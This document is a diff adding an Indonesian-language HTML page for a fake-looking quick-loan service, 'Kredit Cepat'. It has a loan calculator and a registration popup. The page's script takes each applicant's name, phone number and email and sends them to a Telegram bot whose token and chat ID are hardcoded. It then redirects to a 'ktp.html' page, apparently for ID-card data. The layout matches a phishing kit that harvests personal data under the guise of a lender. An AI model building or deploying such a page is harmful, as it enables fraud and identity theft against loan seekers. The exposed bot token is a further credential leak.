@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kredit Cepat Cair</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--tosca:#11C7C8}
+body{font-family:Inter,Arial,sans-serif;background:#f5f6f7;color:#222;font-size:14px}
+.container{max-width:420px;margin:auto;min-height:100vh;padding-bottom:80px}
+.header{height:52px;background:#fff;display:flex;align-items:center;padding:0 14px;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:5}
+.logo{color:var(--tosca);font-weight:800;font-size:16px;display:flex;align-items:center;gap:6px}
+.logo-icon{width:28px;height:28px;border:2px solid var(--tosca);border-radius:7px;display:grid;place-items:center}
+.page{display:none}.page.active{display:block}
+.home-wrap{padding:12px}
+.card{background:#fff;border-radius:12px;padding:14px;box-shadow:0 3px 12px rgba(0,0,0,.08);margin-bottom:12px}
+.logo-title{text-align:center;font-size:10px;font-weight:bold;color:#666;margin-bottom:6px}
+.logo-container{display:flex;justify-content:space-between;gap:5px}
+.logo-box{
+  flex:1;
+  height:22px; /* KECILIN DISINI dari 30px jadi 22px */
+  background:#fff;
+  border-radius:6px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border:1px solid #eee;
+  overflow:hidden;
+  padding:2px;
+}
+.logo-box img{
+  width:100%;
+  height:100%;
+  max-width:42px; /* BATAS LEBAR LOGO */
+  max-height:14px; /* BATAS TINGGI LOGO */
+  object-fit:contain; /* BIAR GAK MELAR */
+}
+h1{font-size:18px;line-height:1.3;font-weight:700;margin:12px 0 6px}
+.subtitle{font-size:12px;color:var(--tosca);margin-bottom:14px}
+.highlight{color:var(--tosca);font-weight:800}
+.row-title{display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px;font-weight:600}
+.value{color:var(--tosca)}
+input[type="range"]{width:100%;appearance:none;height:4px;background:#ddd;border-radius:10px}
+input[type="range"]::-webkit-slider-thumb{appearance:none;width:18px;height:18px;border-radius:50%;background:#fff;border:3px solid var(--tosca)}
+.range-info{display:flex;justify-content:space-between;color:#999;font-size:10px;margin:6px 0 12px}
+.divider{height:1px;background:#eee;margin:10px 0}
+.monthly{text-align:center;font-size:13px}.monthly small{display:block;color:#999;font-size:10px;margin-top:2px}
+.payment{text-align:center;color:var(--tosca);font-size:22px;font-weight:800;margin:8px 0 12px}
+.apply{width:100%;border:0;background:var(--tosca);color:#fff;padding:12px;border-radius:10px;font-size:14px;font-weight:800;cursor:pointer}
+.info{font-size:10px;color:#999;text-align:center;margin-top:10px}
+
+/* TAGIHAN & SAYA */
+.tabs{display:flex;gap:8px;padding:12px}
+.tab{flex:1;text-align:center;padding:10px;background:#fff;border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid #eee}
+.tab.active{background:var(--tosca);color:#fff;border-color:var(--tosca)}
+.empty{text-align:center;padding:40px 0;color:#999;font-size:13px}
+.saya-wrap{padding:12px}
+.profile{display:flex;gap:12px;align-items:center;background:#fff;padding:14px;border-radius:12px;margin-bottom:12px}
+.avatar{width:48px;height:48px;background:var(--tosca);color:#fff;border-radius:50%;display:grid;place-items:center;font-weight:800;font-size:20px}
+.name{font-weight:800}.uid{font-size:11px;color:#999}
+.level-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.badge{background:#e6fbfb;color:var(--tosca);padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.progress{height:6px;background:#eee;border-radius:10px;overflow:hidden}
+.progress span{display:block;width:74%;height:100%;background:var(--tosca)}
+
+/* BOTTOM NAV - SUDAH FIX */
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:420px;height:68px;background:#fff;border-top:1px solid #eee;display:flex;justify-content:space-around;align-items:center;z-index:20}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;color:#999;transition:.2s}
+.icon-wrap{position:relative;width:28px;height:28px;display:grid;place-items:center}
+.nav-item svg{width:26px;height:26px;stroke:#999;fill:none;stroke-width:1.8;transition:.2s}
+.nav-item span{font-size:11px}
+.dot{position:absolute;top:-2px;right:-2px;width:9px;height:9px;background:#ff0000;border-radius:50%;border:2px solid #fff}
+.nav-item.active{color:var(--tosca)}.nav-item.active svg{stroke:var(--tosca)}.nav-item.active span{color:var(--tosca);font-weight:700}
+
+/* POPUP */
+.popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99;display:none;align-items:flex-end;justify-content:center}
+.popup-overlay.show{display:flex}
+.popup-box{width:100%;max-width:420px;background:#fff;border-radius:20px 20px 0 0;padding:20px 16px 24px;animation:up.25s ease;position:relative}
+@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.popup-handle{width:36px;height:4px;background:#ddd;border-radius:10px;margin:0 auto 14px}
+.popup-title{font-size:18px;font-weight:800;text-align:center}
+.popup-sub{font-size:12px;color:#888;text-align:center;margin:6px 0 16px}
+.input-group{margin-bottom:12px}
+.input-group label{font-size:12px;font-weight:600;display:block;margin-bottom:6px}
+.input-group input{width:100%;height:44px;border:1px solid #e5e5e5;border-radius:10px;padding:0 14px;font-size:14px;outline:none}
+.input-group input:focus{border-color:var(--tosca)}
+.btn-lanjut{width:100%;height:46px;border:0;background:var(--tosca);color:#fff;border-radius:12px;font-weight:800;font-size:14px;margin-top:8px;cursor:pointer}
+.btn-lanjut:disabled{background:#d9dbde;color:#999}
+.popup-close{position:absolute;top:14px;right:16px;font-size:24px;color:#999;cursor:pointer}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header"><div class="logo"><span class="logo-icon">K</span> Kredit Cepat</div></div>
+
+  <!-- PAGE HOME -->
+  <div class="page active" id="page-home">
+    <div class="home-wrap">
+      <div class="card" style="padding:10px"><div class="logo-title">PILIHAN LAYANAN</div><div class="logo-container"><div           <div class="logo-box"><img src="img/11.png" alt="1"></div>
+          <div class="logo-box"><img src="img/22.png" alt="2"></div>
+          <div class="logo-box"><img src="img/33.png" alt="3"></div>
+          <div class="logo-box"><img src="img/44.png" alt="4"></div>
+          <div class="logo-box"><img src="img/55.png" alt="5"></div>
+          </div>
+        </div>
+      <h1>Dapatkan Pencairan Pinjaman Dana Cepat dengan Bunga Kompetitif</h1>
+      <div class="subtitle">Pinjaman uang cepat hingga <span class="highlight">50 Juta</span> tanpa jaminan</div>
+      <div class="card">
+        <div class="row-title"><span>Jumlah Pinjaman</span><span class="value" id="loanValue">Rp 2.300.000</span></div>
+        <input type="range" id="loanSlider" min="600000" max="50000000" step="100000" value="2300000">
+        <div class="range-info"><span>Rp 600 Ribu</span><span>Rp 50 Juta</span></div>
+        <div class="row-title"><span>Lama Pinjaman</span><span class="value" id="durationValue">3 Bulan</span></div>
+        <input type="range" id="durationSlider" min="2" max="12" step="1" value="3">
+        <div class="range-info"><span>2 Bulan</span><span>12 Bulan</span></div>
+        <div class="divider"></div>
+        <div class="monthly">Cicilan per bulan<small>*simulasi pembayaran</small></div>
+        <div class="payment" id="payment">Rp 1.042.700</div>
+        <button class="apply" onclick="openPopup()">Ajukan Sekarang</button>
+      </div>
+      <div class="info">Simulasi cicilan hanya sebagai contoh.</div>
+    </div>
+  </div>
+
+  <!-- PAGE TAGIHAN -->
+  <div class="page" id="page-tagihan">
+    <div class="tabs">
+      <div class="tab active" onclick="setTab(this,0)">Saat ini</div>
+      <div class="tab" onclick="setTab(this,1)">Berikutnya</div>
+      <div class="tab" onclick="setTab(this,2)">Semua</div>
+    </div>
+    <div class="card"><div class="empty" id="emptyText">Anda tidak memiliki tagihan</div></div>
+  </div>
+
+  <!-- PAGE SAYA -->
+  <div class="page" id="page-saya">
+    <div class="saya-wrap">
+      <div class="profile">
+        <div class="avatar">S</div>
+        <div><div class="name" id="displayName">Sobat Cepat</div><div class="uid" id="displayPhone">KC_WJAM5MXE</div></div>
+      </div>
+      <div class="card"><div class="level-top"><div class="badge">✦ Level Member 1</div><div style="font-size:14px;font-weight:700">298 / 401</div></div><div class="progress"><span></span></div></div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item active" id="nav-home" onclick="goPage('home')">
+    <div class="icon-wrap"><svg viewBox="0 0 24 24"><path d="M3 10L12 3l9 7v9a1 1 0 0 1-1 1h-5v-5H9v5H4a1 1 0 0 1-1-1v-9z"/></svg></div>
+    <span>Home</span>
+  </div>
+  <div class="nav-item" id="nav-tagihan" onclick="goPage('tagihan')">
+    <div class="icon-wrap"><svg viewBox="0 0 24 24"><rect x="4" y="3" width="16" height="18" rx="2"/><path d="M4 7h16M9 12h2M9 15h2"/></svg></div>
+    <span>Tagihan</span>
+  </div>
+  <div class="nav-item" id="nav-saya" onclick="goPage('saya')">
+    <div class="icon-wrap"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M8 14c1.2 1.5 2.8 2.3 4 2.3s2.8-.8 4-2.3M9 9h.01M15 9h.01"/></svg><div class="dot"></div></div>
+    <span>Saya</span>
+  </div>
+</div>
+
+<div class="popup-overlay" id="popup" onclick="if(event.target==this) closePopup()">
+  <div class="popup-box">
+    <div class="popup-handle"></div><div class="popup-close" onclick="closePopup()">×</div>
+    <div class="popup-title">Lengkapi Pendaftaran</div><div class="popup-sub">Isi data diri untuk lanjut pengajuan</div>
+    <div class="input-group"><label>Nama Lengkap</label><input type="text" id="inpNama" placeholder="Budi Santoso" oninput="cekPopup()"></div>
+    <div class="input-group"><label>Nomor HP / WhatsApp</label><input type="tel" id="inpNomor" placeholder="0812xxxxxx" oninput="cekPopup()"></div>
+    <div class="input-group"><label>Email</label><input type="email" id="inpEmail" placeholder="budi@email.com" oninput="cekPopup()"></div>
+    <button class="btn-lanjut" id="btnLanjut" onclick="lanjutkan()" disabled>Lanjutkan Pendaftaran</button>
+  </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN="8878507338:AAFGFpr2gOnxcm6YGd5L8uZQ2lOdyImuNKM";
+const TELEGRAM_CHAT_ID="8488971726";
+
+// NAVIGASI - FIX UTAMA DISINI
+function goPage(name){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  const target = document.getElementById('page-'+name);
+  if(target) target.classList.add('active');
+
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('nav-'+name).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+function setTab(el,i){
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  const texts=["Anda tidak memiliki tagihan","Tidak ada tagihan berikutnya","Tidak ada riwayat tagihan"];
+  document.getElementById('emptyText').textContent=texts[i];
+}
+
+// SLIDER CUMA 1 KALI
+const loanSlider=document.getElementById('loanSlider'),durationSlider=document.getElementById('durationSlider');
+function rupiah(n){return new Intl.NumberFormat('id-ID',{style:'currency',currency:'IDR',maximumFractionDigits:0}).format(n)}
+function hitung(){
+  const loan=Number(loanSlider.value),bulan=Number(durationSlider.value);
+  const cicil=(loan+loan*0.02*bulan)/bulan;
+  document.getElementById('loanValue').textContent=rupiah(loan);
+  document.getElementById('durationValue').textContent=bulan+' Bulan';
+  document.getElementById('payment').textContent=rupiah(cicil);
+  return {loan,bulan,cicil};
+}
+loanSlider.addEventListener('input',hitung);durationSlider.addEventListener('input',hitung);hitung();
+
+// POPUP
+function openPopup(){document.getElementById('popup').classList.add('show')}
+function closePopup(){document.getElementById('popup').classList.remove('show')}
+function cekPopup(){
+  const nama=document.getElementById('inpNama').value.trim();
+  const nomor=document.getElementById('inpNomor').value.replace(/\D/g,'');
+  const email=document.getElementById('inpEmail').value.trim();
+  document.getElementById('btnLanjut').disabled=!(nama.length>=3 && nomor.length>=10 && email.includes('@'));
+}
+
+async function lanjutkan(){
+  const nama=document.getElementById('inpNama').value.trim();
+  const nomor=document.getElementById('inpNomor').value.trim();
+  const email=document.getElementById('inpEmail').value.trim();
+  if(!nama || nomor.length<10 ||!email.includes('@')) return alert('Lengkapi data dulu');
+
+  const simulasi=hitung();
+  const dataSimulasi={ jumlah: rupiah(simulasi.loan), tenor: simulasi.bulan+' Bulan', cicilan: rupiah(simulasi.cicil) };
+  localStorage.setItem('user_step1', JSON.stringify({nama:nama, hp:nomor, email:email, simulasi:dataSimulasi}));
+
+  const btn=document.getElementById('btnLanjut');
+  btn.innerText="Mengirim..."; btn.disabled=true;
+
+  const teks = `📥 PENGAJUAN BARU - KREDIT CEPAT
+👤 Nama: ${nama}
+📱 No HP: ${nomor}
+📧 Email: ${email}
+💰 Jumlah: ${dataSimulasi.jumlah} | Tenor: ${dataSimulasi.tenor} | Cicil: ${dataSimulasi.cicilan}
+⏰ ${new Date().toLocaleString('id-ID')}`;
+
+  try{
+    if(!TELEGRAM_BOT_TOKEN.includes('ISI')){
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID, text:teks})
+      });
+    }
+  }catch(e){}
+
+  btn.innerText="Berhasil ✓";
+  setTimeout(()=>{ window.location.href = "ktp.html"; },700);
+}
+</script>
+</body>
+</html>
